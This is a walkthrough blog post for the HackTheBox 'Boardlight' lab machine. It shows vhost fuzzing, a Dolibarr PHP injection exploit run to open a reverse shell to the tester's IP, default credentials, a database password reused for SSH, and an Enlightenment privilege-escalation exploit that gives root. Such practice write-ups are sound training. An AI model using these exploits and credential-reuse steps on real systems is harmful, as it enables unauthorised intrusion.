--- 
title: Boardlight Walkthrough
date: 2024-09-14 11:00:00 -0600
author: anthony   
categories: [Walkthroughs, HackTheBox]
tags: [hackthebox, enumeration, privilege-escalation]    # TAG names should always be lowercase
description: 
media_subpath: /assets/posts/boardlight-walkthrough
image:
  path: pwned banner.png
  alt: HackTheBox Machine Image
---

## Enumeration
--------------------------------------------------

This this is a hackthebox machine, it's very common for the IP address to resolve to a domain that ends with `.htb`. That usually the first thing I do before any time to scanning. 

```bash
┌──(kali㉿kali)-[~/…/PenTestingPractice/hackthebox/machines/boardlight]
└─$ curl http://10.10.11.11 | grep .htb
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0                info@board.htb
100 15949    0 15949    0     0  51176      0 --:--:-- --:--:-- --:--:-- 51118
      <a href="https://html.design/">Board.htb</a>
```

The command above grabs `/index.html` on a web application and then pipes the response into the `grep` command. Looks like it returns `info@board.htb` and `Board.htb` which leads us to believe we should add `board.htb` to our `/etc/hosts` file.

> `warning`: this does make the assumption that port 80 is open and running a web server. Just check if you need to.
{: .prompt-warning }

### Quick Nmap Scan Results
```bash
┌──(kali㉿kali)-[~/…/PenTestingPractice/hackthebox/machines/boardlight]
└─$ nmap board.htb  
Starting Nmap 7.94 ( https://nmap.org ) at 2024-09-14 21:38 EDT
Nmap scan report for board.htb (10.10.11.11)
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.86 seconds                                                            
```

We see that the target machine only has two ports only, 22 and 80. Since we already have `board.htb` in our host files, lets do some vhost enumeration. 

### VHost Enumeration With FFUF
```bash
domain=board.htb
word_count=$(curl -s -H "Host: noarealvhost.${domain}" http://$domain | wc -c)
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://$domain -H "Host: FUZZ.$domain" -fs $word_count
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

[Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 149ms]
    * FUZZ: crm

:: Progress: [114441/114441] :: Job [1/1] :: 315 req/sec :: Duration: [0:07:11] :: Errors: 0 ::
```

> This method of VHost enum is good becuse it takes into account the word count instead of just a repsonse status. Less prone to false positives.
{: .prompt-tip}

The results show that there may be virutal host for `crm.board.htb`. Lets add it to our `/etc/hosts` file and check it out.

### Exploring the Identified VHost
![Screenshot of crm.board.htb](<Screenshot of crm.board.htb.png>)


## Foothold
--------------------------------------------------
Doing some [basic recon](https://www.google.com/search?q=Dolibarr+17.0.0+exploit) we can see that this version of Dolibarr is vulernable to [PHP Code Injection (CVE-2023-30253)](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

> Be sure to review any POC code to make sure that there is nothing malcious directly towards the user/hacker. Hackers should avoid being hacked themselves.
{: .prompt-warning}

### Expoiting Vulnerability
After reviewing the code, lets clone the repo and execute it. (Be sure to start a listener)

```bash
git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git
cd Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

python exploit.py http://crm.board.htb login passsword 10.10.14.15 53  
[*] Trying authentication...
[**] Login: login
[**] Password: passsword
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
[!] If you have not received the shell, please check your login and password
```

Alright, so looks like we need legit credentials. Let's look for some.

lol after some more [basic research](https://www.google.com/search?q=dolibarr+17.0.0+default+credentials), there are default creds for `admin:admin`

let's try this again. (Be sure to start a listener)

![Screenshot of script working](<Screenshot of script working.png>)

## Getting a User
-------------------------------------------------------------------

### Enumeration
Looks like we have a foothold as the user `www-data`. This account is normally restricted incase someone is able to hack into it.

#### Enumeration for passwords in files
I like to look for database strings and passwords in the web directory first. The way I approached this was by zipping the whole `/var/www/` directory and exporting it to my machine. 

From there I used vscode to file a file at `/crm.board.htb/htdocs/conf/conf.php` which contained the following uncommented section.

```php
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';
```

#### Check for Password Reuse

```bash
─$ ssh larissa@board.htb        
The authenticity of host 'board.htb (10.10.11.11)' can't be established.
ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'board.htb' (ED25519) to the list of known hosts.
larissa@board.htb's password: 
Last login: Sat Sep 14 17:48:08 2024 from 10.10.14.95
```

*nice.*

## Privilege Escalation
----------------------------------------------

### Checking Sudo Privileges
First thing I checked for is what commands `larissa` could run as sudo. 

```bash
larissa@boardlight:~$ sudo -l
[sudo] password for larissa: 
Sorry, user larissa may not run sudo on localhost.
```

hm.

### Running Linpeas
After running linpeas on the box, it pointed out that there are quite a few files that I had not seen before. `enlightenment`.

![Linpeas Highlighting Enlightenment Utilites](<Linpeas Enlightenment.png>)

After looking up "[what is /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys](https://www.google.com/search?q=what+is+%2Fusr%2Flib%2Fx86_64-linux-gnu%2Fenlightenment%2Futils%2Fenlightenment_sys)" the first thing that popped up was a [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit).

*Snippet from readme:*
> Hello guys, this time I'm gonna talk about a recent 0-day I found in one of the main window managers of Linux called Enlightenment (https://www.enlightenment.org/). This 0-day gonna take any user to root privileges very easily and instantly. The exploit is tested on Ubuntu 22.04, but should work just fine on any distro.

### Expoiting Vulnerability
![Screenshot of root shell](Screenshot of root shell.png){: .w-10 .right}

After copying the script to the target machine and running it, we end up with a root shell. 

Go get your root flag now. :)

## Takeaways
--------------------------------------------------

- **Enumeration** is the backbone of any successful pentest. In this walkthrough, identifying key information from initial scans, like domain names and virtual hosts, led to critical steps later in the attack.

- **Exploiting known vulnerabilities** can save time if identified early. In this case, leveraging the PHP Code Injection vulnerability (CVE-2023-30253) in Dolibarr 17.0.0 gave us initial access.

- **Credential reuse** remains a prevalent attack vector. Discovering the database credentials in config files led to SSH access with reused passwords.

- **Privilege escalation** requires detailed post-exploitation enumeration, often using tools like `Linpeas`. Identifying the presence of `Enlightenment` utilities highlighted an opportunity to escalate privileges using a known exploit (CVE-2022-37706).

- Always **verify Proof of Concept (PoC) code** for malicious content, ensuring that while exploiting vulnerabilities, you aren't compromised yourself.
